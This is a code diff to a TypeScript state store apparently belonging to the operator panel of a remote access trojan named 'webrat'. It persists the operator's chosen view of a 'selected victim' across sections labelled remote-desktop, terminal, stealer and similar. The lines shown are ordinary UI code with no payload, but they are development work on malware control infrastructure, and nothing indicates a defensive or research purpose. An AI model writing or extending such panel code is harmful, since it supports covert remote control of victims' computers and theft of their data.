@@ -21,6 +21,7 @@ type Actions = {
 };
 
 const STORAGE_KEY = "webrat_selected_victim";
+const SECTION_STORAGE_KEY = "webrat_detail_section";
 
 function readSelectedVictimId(): string | null {
     try {
@@ -29,6 +30,30 @@ function readSelectedVictimId(): string | null {
         return fromStorage ? String(fromStorage) : null;
     } catch {
         return null;
+    }
+}
+
+function readSelectedSection(): DetailSectionKey {
+    try {
+        if (typeof window === "undefined") return "information";
+        const fromStorage = sessionStorage.getItem(SECTION_STORAGE_KEY);
+        if (fromStorage) {
+            const validSections: DetailSectionKey[] = ["information", "remote-start", "remote-desktop", "terminal", "stealer", "rofl"];
+            if (validSections.includes(fromStorage as DetailSectionKey)) {
+                return fromStorage as DetailSectionKey;
+            }
+        }
+        return "information";
+    } catch {
+        return "information";
+    }
+}
+
+function writeSelectedSection(section: DetailSectionKey) {
+    try {
+        if (typeof window === "undefined") return;
+        sessionStorage.setItem(SECTION_STORAGE_KEY, section);
+    } catch {
     }
 }
 
@@ -50,11 +75,14 @@ function clearSelectedVictimId() {
 
 export const usePanelDetailViewStore = create<State & Actions>()((set, get) => ({
     isOpen: false,
-    section: "information",
+    section: readSelectedSection(),
     selectedVictimId: readSelectedVictimId(),
     victimSnapshots: {},
 
-    setSection: (next: DetailSectionKey) => set({ section: next }),
+    setSection: (next: DetailSectionKey) => {
+        set({ section: next });
+        writeSelectedSection(next);
+    },
 
     selectVictim: (victimId: string) => {
         const id = String(victimId || "").trim();
